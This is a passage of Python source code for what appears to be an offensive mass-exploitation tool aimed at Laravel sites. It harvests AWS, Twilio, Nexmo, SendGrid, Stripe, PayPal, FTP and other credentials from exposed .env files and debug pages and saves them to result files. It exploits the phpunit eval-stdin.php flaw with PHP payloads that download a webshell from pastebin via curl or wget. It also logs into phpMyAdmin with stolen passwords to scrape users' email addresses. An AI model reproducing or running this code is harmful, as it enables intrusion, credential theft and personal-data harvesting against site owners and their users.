                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split[3])
                        objek += 1
                except:
                    pass
            if "AWS_KEY=" in teks:
                try:
                    key = re.findall('AWS_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('AWS_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('AWS_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if 'SES_KEY=' in teks:
                try:
                    key = re.findall('SES_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if ' ' in key:
                        key = key.replace(' ','')
                    sec = re.findall('SES_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if ' ' in sec:
                        sec = sec.replace(' ','')
                    try:
                        region = re.findall('SES_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if ' ' in region:
                            region = region.replace(' ','')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if 'S3_KEY=' in teks:
                try:
                    key = re.findall('S3_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if ' ' in key:
                        key = key.replace(' ','')
                    sec = re.findall('S3_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if ' ' in sec:
                        sec = sec.replace(' ','')
                    try:
                        region = re.findall('S3_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if ' ' in region:
                            region = region.replace(' ','')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if 'AWS_S3_KEY=' in teks:
                try:
                    key = re.findall('AWS_S3_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if ' ' in key:
                        key = key.replace(' ','')
                    sec = re.findall('AWS_S3_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if ' ' in sec:
                        sec = sec.replace(' ','')
                    try:
                        region = re.findall('AWS_S3_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if ' ' in region:
                            region = region.replace(' ','')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return objek
        elif method == 'debug':
            if 'AWS_ACCESS_KEY_ID' in teks:
                try:
                    key = re.findall('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    else:
                        pass
                    if ' ' in key:
                        key = key.replace(' ', '')
                    else:
                        pass
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    else:
                        pass
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'",'')
                    else:
                        pass
                    sec = re.findall('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    else:
                        pass
                    if ' ' in sec:
                        sec = sec.replace(' ', '')
                    else:
                        pass
                    if sec.startswith('"') and sec.endswith('"'):
                        sec = sec.replace('"', '')
                    else:
                        pass
                    if sec.startswith("'") and sec.endswith("'"):
                        sec = sec.replace("'",'')
                    else:
                        pass
                    try:
                        region = re.findall('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key or '*****' in sec or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if "AWS_KEY" in teks:
                try:
                    key = re.findall('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key or '*****' in sec:
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if "S3_KEY" in teks:
                try:
                    key = re.findall('<td>S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>S3_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key:
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if "AWS_S3_KEY" in teks:
                try:
                    key = re.findall('<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>AWS_S3_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key:
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],asu.split('|')[3])
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return objek
        else:
            return False

    def get_twilio(self, method, urlku, teks):
        objek = 0
        if method == 'env':
            if 'TWILIO_SID=' in teks:
                try:
                    sid = re.findall('TWILIO_SID=(.*?)\n', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('TWILIO_TOKEN=(.*?)\n', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""':
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        ceker_twilio(urlku, sid, token)
                        objek += 1
                except:
                    pass
            if 'TWILIO_ACCOUNT_SID=' in teks:
                try:
                    sid = re.findall('TWILIO_ACCOUNT_SID=(.*?)\n', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('TWILIO_AUTH_TOKEN=(.*?)\n', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""' or '****' in sid:
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        ceker_twilio(urlku, sid, token)
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return True
        elif method == 'debug':
            if 'TWILIO_SID' in teks:
                try:
                    sid = re.findall('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""' or '****' in sid:
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        ceker_twilio(urlku, sid, token)
                        objek += 1
                except:
                    pass
            if 'TWILIO_ACCOUNT_SID' in teks:
                try:
                    sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""' or '****' in sid:
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        ceker_twilio(urlku, sid, token)
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return objek

    def get_nexmo(self, method, urlku, teks):
        if method == 'env':
            if 'NEXMO_KEY=' in teks:
                try:
                    key = re.findall('NEXMO_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('NEXMO_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            elif 'NEXMO_API_KEY=' in teks:
                try:
                    key = re.findall('NEXMO_API_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('NEXMO_API_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'NEXMO_KEY' in teks:
                try:
                    key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '******':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            elif 'NEXMO_API_KEY' in teks:
                try:
                    key = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '******':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        else:
            return False
    def get_sendgrid(self, method, urlku, teks):
        if method == 'env':
            if 'SENDGRID_APIKEY=' in teks:
                try:
                    key = re.findall('SENDGRID_APIKEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key))
                        ceker_sendgrid(urlku,satu.split('|')[1])
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'SENDGRID_APIKEY' in teks:
                try:
                    key = re.findall('<td>SENDGRID_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '******':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key))
                        ceker_sendgrid(urlku,satu.split('|')[1])
                except:
                    return False
            else:
                return False
        else:
            return False

    def get_stripe(self, method, urlku, teks):
        if method == 'env':
            if 'STRIPE_KEY=' in teks:
                try:
                    key = re.findall('STRIPE_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('STRIPE_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + key + "|" + sec)
                        with open('Result/stripe.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'STRIPE_KEY' in teks:
                try:
                    key = re.findall('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '*****':
                        return False
                    else:
                        satu = clean(urlku + '|' + key + "|" + sec)
                        with open('Result/stripe.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        else:
            return False

    def get_plivo(self, method, urlku, teks):
        if method == 'env':
            if "PLIVO_AUTH_ID=" in teks:
                try:
                    key = re.findall('PLIVO_AUTH_ID=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    secret = re.findall('PLIVO_AUTH_TOKEN=(.*?)\n', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if key == '' or key == 'null' or key == '""':
                        pass
                    else:
                        satu = clean(urlku + '|' + key + "|" + secret)
                        with open('Result/plivo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if "PLIVO_AUTH_ID" in teks:
                try:
                    key = re.findall('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    secret = re.findall('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if key == '' or key == 'null' or key == '""' or '****' in key:
                        pass
                    else:
                        satu = clean(urlku + '|' + key + "|" + secret)
                        with open('Result/plivo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        else:
            return False

    def get_ftp(self, method, urlku, teks):
        if method == 'env':
            if 'FTP_HOST=' in teks:
                try:
                    host = re.findall('FTP_HOST=(.*?)\n', teks)[0]
                    user = re.findall('FTP_USERNAME=(.*?)\n', teks)[0]
                    passwd = re.findall('FTP_PASSWORD=(.*?)\n', teks)[0]
                    if host == '' or host == 'null' or host == '""':
                        pass
                    else:
                        satu = clean('ftp://' + str(host) + "|" + str(user) + '|' + str(passwd))
                        with open('Result/ftp.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'FTP_HOST' in teks:
                try:
                    host = re.findall('<td>FTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    user = re.findall('<td>FTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    passwd = re.findall('<td>FTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if host == '' or host == 'null' or host == '""' or '****' in host:
                        pass
                    else:
                        satu = clean('ftp://' + str(host) + "|" + str(user) + '|' + str(passwd))
                        with open('Result/ftp.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False

    def get_paypal(self, method, urlku, teks):
        f_tp = 0
        if method == 'env':
            if 'PAYPAL_CLIENT_ID=' in teks:
                try:
                    key = re.findall('PAYPAL_CLIENT_ID=(.*?)\n', teks)[0]
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    else:
                        pass
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'", '')
                    else:
                        pass
                    if '\r' in key:
                        key.replace('\r', '')
                    else:
                        pass
                    secret = re.findall('PAYPAL_CLIENT_SECRET=(.*?)\n', teks)[0]
                    if secret.startswith('"') and secret.endswith('"'):
                        secret.replace('"', '')
                    else:
                        pass
                    if secret.startswith("'") and secret.endswith("'"):
                        secret.replace("'", '')
                    else:
                        pass
                    if '\r' in secret:
                        secret.replace('\r', '')
                    else:
                        pass
                    if key == '' or key == 'null' or secret == '' or secret == 'null':
                        pass
                    else:
                        one = urlku + '|' + str(key) + '|' + str(secret)
                        open('Result/paypal_sanbox.txt', 'a').write(one + '\n')
                        f_tp += 1
                except:
                    pass
            else:
                pass
        if method == 'debug':
            if 'PAYPAL_CLIENT_ID' in teks:
                try:
                    key = re.findall('<td>PAYPAL_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'", '')
                    if '\r' in key:
                        key.replace('\r', '')
                    secret = re.findall('<td>PAYPAL_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if secret.startswith('"') and secret.endswith('"'):
                        secret.replace('"', '')
                    if secret.startswith("'") and secret.endswith("'"):
                        secret.replace("'", '')
                    if '\r' in secret:
                        secret.replace('\r', '')
                    if key == '' or key == 'null' or secret == '' or secret == 'null' or '*****' in key:
                        pass
                    else:
                        one = urlku + '|' + str(key) + '|' + str(secret)
                        open('Result/paypal_sanbox.txt', 'a').write(one + '\n')
                        f_tp += 1
                except:
                    pass
            else:
                pass
        else:
            pass
        if f_tp == 0:
            return False
        else:
            return f_tp

    def get_smsto(self, method, urlku, teks):
        ambil = 0
        if method == 'env':
            if 'SMSTO_CLIENT_ID=' in teks:
                try:
                    key = re.findall('SMSTO_CLIENT_ID=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'", '')
                    secret = re.findall('SMSTO_CLIENT_SECRET=(.*?)\n', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if secret.startswith('"') and secret.endswith('"'):
                        secret = secret.replace('"', '')
                    if secret.startswith("'") and secret.endswith("'"):
                        secret = secret.replace("'", '')
                    if key == '' or key == 'null' or secret == '' or secret == 'null':
                        pass
                    else:
                        sms = clean(urlku + '|' + str(key) + '|' + str(secret))
                        open('Result/smsto.txt', 'a').write(sms + '\n')
                        ambil += 1
                except:
                    pass
            else:
                pass
        if method == 'debug':
            if 'SMSTO_CLIENT_ID' in teks:
                try:
                    key = re.findall('<td>SMSTO_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    secret = re.findall('<td>SMSTO_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if key == '' or key == 'null' or secret == '' or secret == 'null':
                        pass
                    else:
                        sms = clean(urlku + '|' + str(key) + '|' + str(secret))
                        open('Result/smsto.txt', 'a').write(sms + '\n')
                        ambil += 1
                except:
                    pass
            else:
                pass
        else:
            pass
        if ambil == 0:
            return False
        else:
            return ambil


def gas(tar):
    tss = tar
    vuln = False
    for i in path:
        if '/[DOMAIN]/' in i:
            pee = parser_url(tss)
            if pee.count('.') == 3:
                try:
                    find_domain = socket.gethostbyaddr(pee)[0]
                except:
                    find_domain = False
                if find_domain == False:
                    i = i.replace('[DOMAIN]', pee)
                else:
                    i = i.replace('[DOMAIN]', find_domain)
            else:
                i = i.replace('[DOMAIN]', pee)
            # print(i)
        # print(tss+i)
       
        req1 = requests.get(
            tss + i,
            headers=head,
            timeout=int(default_timeout),
            allow_redirects=False,
            verify=False
        )
        req = req1.text
        if 'DB_PASSWORD=' in req or 'APP_KEY=' in req or 'APP_URL=' in req or "APP_NAME=" in req or req1.status_code == "200":
            vuln = tss + i
            break
    if vuln == False:
        req1 = requests.post(
            tss,
            headers=head,
            data={
                '0x[]': 'ridho'
            },
            timeout=int(default_timeout),
            allow_redirects=False,
            verify=False
        ).text
        if '<td>APP_URL</td>' in req1 or '<td>APP_KEY</td>' in req1 or '<td>DB_PASSWORD</td>' in req1 or "<td>APP_NAME</td>" in req1:
            vuln = tss
            if 'https://' in vuln:
                return {
                    'scoket': 'http',
                    'status': 'ok',
                    'method': 'debug',
                    'url': vuln,
                    'respon': req1
                }
            elif 'https://' in vuln:
                return {
                    'socket': 'https',
                    'status': 'ok',
                    'method': 'debug',
                    'url': vuln,
                    'respon': req1
                }
        else:
            return {
                'status': 'gagal',
                'url': tss
            }
    else:
        if 'https://' in vuln:
            return {
                'socket': 'http',
                'status': 'ok',
                'method': 'env',
                'url': vuln,
                'respon': req
            }
        elif 'https://' in vuln:
            return {
                'socket': 'https',
                'status': 'ok',
                'method': 'env',
                'url': vuln,
                'respon': req
            }


exp = [
    '<?php system("curl -O https://pastebin.com/raw/QGrjKCsR"); system("mv QGrjKCsR upper.php"); ?>',
    '<?php system("wget https://pastebin.com/raw/QGrjKCsR -O upper.php"); ?>',
    '<?php fwrite(fopen("upper.php","w+"),file_get_contents("https://pastebin.com/raw/QGrjKCsR")); ?>'
]


def phpunit(target):
    url_req = target.replace('.env', 'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
    vulner = False
    for rce in exp:
        r = requests.get(url_req, data=rce, headers=head, allow_redirects=False, timeout=int(default_timeout))
        tes_point = requests.get(url_req.replace('eval-stdin.php', 'upper.php'), headers=head, timeout=15)
        if 'Vuln!!' in tes_point.text:
            with open('Result/shell.txt', 'a') as epep:
                epep.write(url_req.replace('eval-stdin.php', 'upper.php') + '\n')
            vulner = True
            break
        else:
            vulner = False
    if vulner == False:
        return False
    else:
        return True


def phpmyadmin(target, user, pw):
    try:
        if 'https://' in target:
            pol = 'https://' + parser_url(target)
        elif 'https://' in target:
            pol = 'https://' + parser_url(target)
        req = requests.Session()
        uwu = req.get(pol + '/phpmyadmin', headers=head, timeout=int(default_timeout))
        if '<title>phpMyAdmin</title>' in uwu.text or 'pma_username' in uwu.text:
            #if 'pma_servername' in uwu.text:
            #    open('phpmyadmin.txt','a').write(pol+'/phpmyadmin\n')
            # print(target,user,pw)
            try:
                token = re.findall('<input type="hidden" name="token" value="(.*?)"', uwu.text)[0]
            except:
                token = ''
            data = {
                'pma_username': user,
                'pma_password': pw,
                'server': '1',
                'target': 'index.php',
                'token': token
            }
            # print(data)
            coba = req.post(pol + '/phpmyadmin/index.php', data=data, timeout=int(default_timeout))
            if 'Log out' in coba.text or token in coba.url:
                #print(coba.text)
                open('Result/phpmyadmin.txt', 'a').write(pol + '/phpmyadmin' + '|{}|{}'.format(user, pw) + '\n')
                supp = bs4.BeautifulSoup(coba.text.encode('utf-8'),'html.parser')
                link_db = []
                emaill = []
                for yum in supp.find_all('a'):
                    try:
                        if 'db_structure.php?server=' in yum['href']:
                            if 'mysql' in yum['href'] or 'performance_schema' in yum['href'] or 'information_schema' in yum['href'] or 'sys' in yum['href'] or 'phpmyadmin' in yum['href']:
                                pass
                            else:
                                if yum['href'] in link_db:
                                    pass
                                else:
                                    link_db.append(yum['href'])
                    except:
                        pass
                if len(link_db) != 0:
                    links_table = []
                    for dbb in link_db:
                        shit = req.get(pol+'/phpmyadmin/'+dbb,timeout=int(default_timeout))
                        supp2 = bs4.BeautifulSoup(shit.text.encode('utf-8'),'html.parser')
                        for table in supp2.find_all('a'):
                            try:
                                if "sql.php?" in table['href']:
                                    if 'user' in table['href'] or 'account' in table['href'] or 'email' in table['href']:
                                        if table['href'] in links_table:
                                            pass
                                        else:
                                            links_table.append(table['href'])
                            except:
                                pass
                        if len(links_table) != 0:
                            for colum in links_table:
                                try:
                                    men = req.get(pol+'/phpmyadmin/'+colum,timeout=int(default_timeout))
                                    supp3 = bs4.BeautifulSoup(men.text.encode('utf-8'),'html.parser')
                                    #for fom in supp3.find_all('form',{'action':'sql.php'},{'method':'post'}):
                                    #    print(fom)
                                    for colums in re.findall('>(.*@.*?)</td>',men.text):
                                        if '<' in colums or '{' in colums or ';' in colums:
                                            pass
                                        else:
                                            if ',' in colums:
                                                colums = colums.split('|')[0]
                                            else:
                                                pass
                                            if ' ' in colums:
                                                colums = colums.replace(' ','')
                                            else:
                                                pass
                                            if colums.endswith('...'):
                                                pass
                                            else:
                                                if colums in emaill:
                                                    pass
                                                else:
                                                    emaill.append(colums)
                                except:
                                    pass
                            if len(emaill) != 0:
                                #print(emaill)
                                open('phpmyadmin.txt','a').write(pol+'/phpmyadmin\n')
                                for emain in emaill:
